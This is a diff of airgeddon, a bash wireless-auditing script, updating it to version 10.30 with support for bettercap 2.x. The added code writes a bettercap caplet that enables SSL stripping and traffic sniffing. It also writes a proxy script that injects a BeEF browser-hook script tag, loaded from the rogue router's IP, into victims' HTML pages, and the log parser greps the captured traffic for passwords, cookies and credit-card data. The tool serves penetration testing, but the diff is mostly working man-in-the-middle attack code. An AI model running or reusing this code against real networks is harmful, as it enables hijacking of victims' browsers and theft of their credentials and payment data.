@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Version......: 10.21
+#Version......: 10.30
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -128,8 +128,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="10.21"
-language_strings_expected_version="10.21-1"
+airgeddon_version="10.30"
+language_strings_expected_version="10.30-1"
 standardhandshake_filename="handshake-01.cap"
 standardpmkid_filename="pmkid_hash.txt"
 standardpmkidcap_filename="pmkid.cap"
@@ -255,10 +255,12 @@ bettercap_proxy_port="8080"
 bettercap_dns_port="5300"
 minimum_bettercap_advanced_options="1.5.9"
 minimum_bettercap_fixed_beef_iptables_issue="1.6.2"
-maximum_bettercap_supported_version="1.6.2"
+bettercap2_version="2.0"
 sslstrip_file="ag.sslstrip.log"
 ettercap_file="ag.ettercap.log"
 bettercap_file="ag.bettercap.log"
+bettercap_config_file="ag.bettercap.cap"
+bettercap_hook_file="ag.bettercap.js"
 beef_port="3000"
 beef_control_panel_url="http://${loopback_ip}:${beef_port}/ui/panel"
 jshookfile="hook.js"
@@ -2425,7 +2427,7 @@ function select_secondary_et_interface() {
 	print_hint ${current_menu}
 
 	read -rp "> " secondary_iface
-	if [ "${secondary_iface}" -eq 0 ]; then
+	if [ "${secondary_iface}" -eq 0 ] 2> /dev/null; then
 		if [ -n "${enterprise_mode}" ]; then
 			return_to_enterprise_main_menu=1
 		else
@@ -5399,6 +5401,8 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
 	rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
 	rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
 	if [ "${beef_found}" -eq 1 ]; then
 		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
@@ -5995,12 +5999,6 @@ function beef_pre_menu() {
 				if check_interface_wifi "${interface}"; then
 					et_mode="et_sniffing_sslstrip2"
 					get_bettercap_version
-					if compare_floats_greater_than "${bettercap_version}" "${maximum_bettercap_supported_version}"; then
-						echo
-						language_strings "${language}" 174 "red"
-						language_strings "${language}" 115 "read"
-						return
-					fi
 					et_dos_menu
 				else
 					echo
@@ -8807,6 +8805,49 @@ function exec_et_captive_portal_attack() {
 	clean_tmpfiles
 }
 
+#Create configuration files for bettercap
+function set_bettercap_config() {
+
+	debug_print
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
+
+	#TODO experimental configuration form bettercap 2.x
+	{
+	echo -e "net.recon off\n"
+	echo -e "set http.proxy.port ${bettercap_proxy_port}"
+	echo -e "set http.proxy.script ${bettercap_hook_file}"
+	echo -e "set http.proxy.sslstrip true"
+	echo -e "http.proxy on\n"
+	echo -e "set net.sniff.verbose true"
+	echo -e "net.sniff on\n"
+	echo -e "events.ignore net.sniff.http.response"
+	echo -e "events.ignore http.proxy.spoofed-response"
+	echo -e "events.ignore net.sniff.dns"
+	echo -e "events.ignore net.sniff.tcp"
+	echo -e "events.ignore net.sniff.udp"
+	echo -e "events.ignore net.sniff.mdns"
+	echo -e "events.ignore net.sniff.sni"
+	} >> ${tmpdir}${bettercap_config_file}
+
+	{
+	echo -e "function onLoad() {"
+	echo -e "\tlog('BeefInject loaded.');"
+	echo -e "\tlog('targets: ' + env['arp.spoof.targets']);"
+	echo -e "}\n"
+	echo -e "function onResponse(req, res) {"
+	echo -e "\tif (res.ContentType.indexOf('text/html') == 0) {"
+	echo -e "\t\tvar body = res.ReadBody();"
+	echo -e "\t\tif (body.indexOf('</head>') != -1) {"
+	echo -e "\t\t\tres.Body = body.replace('</head>', '<script type=\"text/javascript\" src=\"http://${et_ip_router}:${beef_port}/${jshookfile}\"></script></head>');"
+	echo -e "\t\t}"
+	echo -e "\t}"
+	echo -e "}"
+	} >> ${tmpdir}${bettercap_hook_file}
+}
+
 #Create configuration file for hostapd
 function set_hostapd_config() {
 
@@ -10647,6 +10688,7 @@ function set_beef_config() {
 	echo -e "            hook_root: false"
 	echo -e "    database:"
 	echo -e "        driver: \"sqlite\""
+	echo -e "        file: \"${beef_db_path}\""
 	echo -e "        db_file: \"${beef_db_path}\""
 	echo -e "    credentials:"
 	echo -e "        user: \"beef\""
@@ -10910,14 +10952,26 @@ function launch_bettercap_sniffing() {
 	recalculate_windows_sizes
 	sniffing_scr_window_position=${g4_bottomright_window}
 
-	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
-		bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
-	fi
+	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
 
-	bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
+		#TODO test this for bettercap 2.x
+		set_bettercap_config
 
-	if [ ${bettercap_log} -eq 1 ]; then
-		bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
+		bettercap_cmd="bettercap -iface ${interface} -no-history -caplet ${tmpdir}${bettercap_config_file}"
+
+		if [ ${bettercap_log} -eq 1 ]; then
+			bettercap_cmd+=" | tee ${tmp_bettercaplog}"
+		fi
+	else
+		if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
+			bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
+		fi
+
+		bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
+
+		if [ ${bettercap_log} -eq 1 ]; then
+			bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
+		fi
 	fi
 
 	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"Sniffer+Bettercap-Sslstrip2/BeEF\"" "${bettercap_cmd}" "Sniffer+Bettercap-Sslstrip2/BeEF"
@@ -10980,7 +11034,11 @@ function parse_bettercap_log() {
 	echo
 	language_strings "${language}" 304 "blue"
 
-	local regexp='USER|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE'
+	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
+		sed -i 's/\x1b\[[0-9;]*m//g' "${tmp_bettercaplog}"
+	fi
+
+	local regexp='USER|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE|CORREO|MAIL'
 	local regexp2='USER-AGENT|COOKIES|BEEFHOOK'
 	readarray -t BETTERCAPLOG < <(cat < "${tmp_bettercaplog}" 2> /dev/null | grep -E -i ${regexp} | grep -E -vi ${regexp2})
 
@@ -10996,6 +11054,8 @@ function parse_bettercap_log() {
 	echo "---------------"
 	echo ""
 	} >> "${tmpdir}parsed_file"
+
+	#TODO improve parser for bettercap 2.x
 
 	pass_counter=0
 	captured_cookies=()
